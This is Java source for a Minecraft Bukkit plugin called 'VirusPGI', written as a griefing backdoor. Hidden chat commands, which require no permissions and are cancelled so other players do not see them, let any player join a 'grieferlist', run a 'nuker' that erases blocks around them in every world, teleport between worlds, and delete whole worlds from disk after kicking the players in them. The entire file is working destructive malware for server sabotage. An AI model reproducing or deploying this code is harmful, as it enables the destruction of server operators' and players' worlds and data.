package net.inprogressing.VirusPGI.all;

import net.inprogressing.VirusPGI.main.Main;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.entity.Entity;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerMoveEvent;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scheduler.BukkitTask;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

public class All implements Listener {
    private List<Player> grieferList = new ArrayList<>();
    private List<World> mustDeleteWorld = new ArrayList<>();
    private List<Player> nukerList = new ArrayList<>();
    private BukkitTask nuker;

    private String publicPrefix = "§8[§r§4§lVirusPGI§r§8] §7";

    @EventHandler
    public void List(AsyncPlayerChatEvent e){
        Player p = e.getPlayer();

        if(e.getMessage().equals("-add")){
            if(!grieferList.contains(p)) {
                grieferList.add(p);
                sendGrieferMessage(publicPrefix + p.getName() + " joined the grieferlist!");
            } else {
                p.sendMessage(publicPrefix + "you already in the grieferlist.");
            }
            e.setCancelled(true);
        } else if(e.getMessage().contains("-add")){
            String cmd = e.getMessage();
            cmd = cmd.replaceAll("-add ", "");
            Player on = Bukkit.getPlayer(cmd);
            if(on != null){
                if(!grieferList.contains(on)) {
                    grieferList.add(on);
                    sendGrieferMessage(publicPrefix + on.getName() + " joined the grieferlist!");
                } else {
                    p.sendMessage(publicPrefix + "the player " + cmd + " is already in the grieferlist.");
                }
            } else {
                p.sendMessage(publicPrefix + "the player " + cmd + " is not online.");
            }
            e.setCancelled(true);
        }

        if(e.getMessage().equals("-remove")){
            if(grieferList.contains(p)) {
                grieferList.remove(p);
                sendGrieferMessage(publicPrefix + p.getName() + " leaved the grieferlist!");
            } else {
                p.sendMessage(publicPrefix + "you were not in the grieferlist.");
            }
            e.setCancelled(true);
        } else if(e.getMessage().contains("-remove")){
            String cmd = e.getMessage();
            cmd = cmd.replaceAll("-remove ", "");
            Player on = Bukkit.getPlayer(cmd);
            if(on != null){
                if(grieferList.contains(on)) {
                    grieferList.remove(on);
                    sendGrieferMessage(publicPrefix + on.getName() + " leaved the grieferlist!");
                } else {
                    p.sendMessage(publicPrefix + "the player " + cmd + " is not in the grieferlist.");
                }
            } else {
                p.sendMessage(publicPrefix + "the player " + cmd + " is not online.");
            }
            e.setCancelled(true);
        }

        if(e.getMessage().equals("-list")){
            String msg = "";
            for(int i=0;i<grieferList.size();i++){
                if(i == 0){
                    msg += grieferList.get(i).getDisplayName();
                } else {
                    msg += ", " + grieferList.get(i).getDisplayName();
                }
            }
            p.sendMessage(publicPrefix + msg);
            e.setCancelled(true);
        }
    }

    @EventHandler
    public void Nuker(AsyncPlayerChatEvent e){
        Player p = e.getPlayer();
        if(e.getMessage().equals("-nuker")){
            if(nukerList.contains(p)){
                nukerList.remove(p);
                p.sendMessage(publicPrefix + "disabled nuker.");
            } else {
                nukerList.add(p);
                p.sendMessage(publicPrefix + "enabled nuker.");
            }
        }

        if(nuker == null){
            startNuker();
        }
        e.setCancelled(true);
    }

    private void startNuker() {
        nuker = new BukkitRunnable() {
            @Override
            public void run() {
                int range = 5;
                for (Player all : nukerList) {
                    Location loc = all.getLocation();
                    for (int x = (int) (loc.getX() - range); x < loc.getX() + range; x++) {
                        for (int y = (int) (loc.getY() - range); y < loc.getY() + range; y++) {
                            for (int z = (int) (loc.getZ() - range); z < loc.getZ() + range; z++) {
                                for(World w : Bukkit.getWorlds()){
                                    new Location(w, x, y, z).getBlock().setType(Material.AIR);
                                }
                            }
                        }
                    }
                }
            }
        }.runTaskTimer(Main.getplugin(), 0, 1);
    }

    @EventHandler
    public void World(AsyncPlayerChatEvent e){
        Player p = e.getPlayer();
        if(e.getMessage().equals("-world list")){
            p.sendMessage(publicPrefix + "§fWorlds: " + Bukkit.getWorlds().size());
            for(World w : Bukkit.getWorlds()){
                p.sendMessage(publicPrefix + w.getName());
            }
            e.setCancelled(true);
        }

        if(e.getMessage().contains("-world delete")){
            String msg = e.getMessage();
            msg = msg.replaceAll("-world delete ", "");
            if(msg.equals("all")){
                for(World w : Bukkit.getWorlds()){
                    mustDeleteWorld.add(w);
                }
                p.sendMessage(publicPrefix + "delete all worlds...");
            } else {
                World del = Bukkit.getWorld(msg);
                if(del != null){
                    mustDeleteWorld.add(del);
                    p.sendMessage(publicPrefix + "delete world...");
                } else {
                    p.sendMessage(publicPrefix + "the world " + msg + " not exists");
                }
            }
            e.setCancelled(true);
        }

        if(e.getMessage().contains("-world tp")){
            String msg = e.getMessage();
            msg = msg.replaceAll("-world tp ", "");
            World tp = Bukkit.getWorld(msg);
            if(tp != null){
                p.teleport(tp.getSpawnLocation());
                p.sendMessage(publicPrefix + "teleported to world " + tp.getName());
            } else {
                p.sendMessage(publicPrefix + "the world " + msg + " not exists");
            }
            e.setCancelled(true);
        }
    }

    @EventHandler
    public void onWorldDelter(PlayerMoveEvent e){
        try {
            for (World w : mustDeleteWorld) {
                sendGrieferMessage(publicPrefix + "Delete world " + w.getName());
                for (Player kick : w.getPlayers()) {
                    kick.kickPlayer("null");
                }
                Bukkit.unloadWorld(w, true);
                String thisPath = new File("").getAbsolutePath();
                thisPath += "\\" + w.getName();
                deleteFile(new File(thisPath));
                sendGrieferMessage(publicPrefix + "Deleted world " + w.getName());
            }
            mustDeleteWorld.clear();
        } catch(Exception e2){
            //null
        }
    }

    private void deleteFile(File file){
        try {
            File[] files = file.listFiles();
            for(File f : files){
                if(f.isDirectory()){
                    deleteFile(f);
                } else {
                    f.delete();
                }
            }
            file.delete();
        } catch(Exception e){
            //null
        }
    }

    private void sendGrieferMessage(String msg){
        for(Player all : grieferList){
            all.sendMessage(msg);
        }
    }
}
